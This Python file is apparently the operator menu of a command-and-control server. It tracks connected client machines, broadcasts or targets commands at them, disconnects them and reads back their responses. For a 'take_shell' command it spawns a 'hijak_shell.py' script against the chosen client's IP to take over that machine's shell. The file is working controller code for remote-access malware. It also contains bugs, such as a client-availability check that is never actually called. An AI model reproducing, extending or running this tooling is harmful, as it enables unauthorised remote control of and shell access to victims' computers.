from server import *
from cmd_type_helper import *
import time
import subprocess



####################### help functions #######################################
def is_num(s):
    b_Int = True
    try:
        # converting to integer
        int(s)
    except ValueError:
        b_Int = False
    return b_Int


def ask_list_index(instruction, list_len):
    op = input(instruction)
    cond = is_num(op) and int(op)>=1 and int(op) < list_len+1

    while(not cond):
        print('please choose number from the list!')
        op = input(instruction)
        cond = is_num(op) and int(op)>=1 and int(op) < list_len+1
    index = int(op)-1
    return index

##################################################################


#######################  CLI FUNCTIONS ###########################
def get_active_conns():
    connected_clients = filter(lambda addr: clients_status[addr] == 'ON', clients_status.keys())
    return list(connected_clients)

def any_active_client():
    actives = get_active_conns()
    while len(actives)==0:
        Op= input("""ALL CLIENTS ARE DISCONNECTED.\n
enter 'r' to refresh
OR
<---- enter anything else to GO BACK to main menu <---- \n\n""")
        if Op=='r':
            actives = get_active_conns()
            continue
        else:
            return False
    return True


def show_conn_stats():
    if clients_status == {}:
        print("No connections available.\n")
    for cl in clients_status.keys():
        print(cl,"    ", clients_status[cl], "\n")
    print("\n")


def broadcast(cmd):
    active_clients      = get_active_conns()
    for addr in active_clients: 
        conn = clients_conns[addr]
        send_msg(conn, cmd)


def choose_cmd():
    list_len = len(commands_list)
    if list_len==0:
        return
    for i in range(list_len):
        print(i+1, "  " ,commands_list[i].type)
    cmd_index = ask_list_index(instruction="Choose command:",list_len=list_len ) 
    return commands_list[cmd_index]


def choose_client():
    active_clients = get_active_conns()
    list_len = len(active_clients)
    if list_len==0:
        return
    for i in range(list_len):
        print(i+1, "  " ,active_clients[i])
    client_index = ask_list_index(instruction="Choose Client:", list_len=list_len )
    addr = active_clients[client_index]
    conn = clients_conns[addr]
    return conn, addr


def show_responses():
    filepath = os.path.join(os.getcwd(), "responses")
    try:
        with open(filepath, "r") as f:
            data = f.read()
        f.close()
        return data
    except FileNotFoundError:
        return 'there are no responses yet'


def show_responses_refresher():
    data = show_responses()
    print(data)
    Op = input("""enter 'r' to refresh
OR
enter anything else to GO BACK to main menu. <----\n\n""")
    if Op == 'r':
        return True
    else:
        return False


def start_hijak(args):
    subprocess.run(args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
###################################################################



######################### CLI #####################################

def main_menu():
    while(True):
        show_conn_stats()

        Op = input("""Choose Operation:\n 
    1)  send command \n 
    2)  kill client\n
    3)  display commands status\n""")


        if Op == '1':
            if not any_active_client(): # if returned false - return to main menu
                continue
            cmd = choose_cmd()
            cmd.enter_args()

            subOp = input("""broadcast to all ?\n 
    1)  NO. choose one client. \n
    2)  YES.\n
    3)  <---  Go Back  <--- \n""")

            if subOp == '1':
                if not any_active_client: # if returned false
                    continue                # go to main menu

                client_conn, addr = choose_client()
                if cmd.type == 'take_shell': 
                    ip = addr[0]
                    args_to_run = [sys.executable,'hijak_shell.py',ip]+cmd.args
                    thread   = threading.Thread(target=start_hijak, args=(args_to_run,))
                    thread.start()
                    send_msg(client_conn, cmd)
                    print("restart me")
                continue

            elif subOp == '2':
                if not any_active_client: # if returned false
                    continue                 # go to main menu
                if cmd.type == 'take_shell': 
                    print('cannot broadcast this command!')
                    continue
                broadcast(cmd)
                continue
            else:
                continue
        
        elif Op == '2':
            if not any_active_client(): # if returned false
                continue                # go to main menu
            cl,addr = choose_client()
            subOp = input("""Are you sure?\n 
            1)  YES. \n
            2)  <---  Go Back  <--- \n""")
            if subOp!='1':
                continue
            client_disconnect(cl,addr)
            continue

        elif Op == '3':
            refresh = show_responses_refresher()
            while refresh:
                refresh = show_responses_refresher()
            continue
        else:
            continue

                


def main():

    thread   = threading.Thread(target=clients_handler)
    thread.start()
    
    thread   = threading.Thread(target=main_menu, daemon=True)
    thread.start()
        
   

if __name__ == "__main__":
    main()
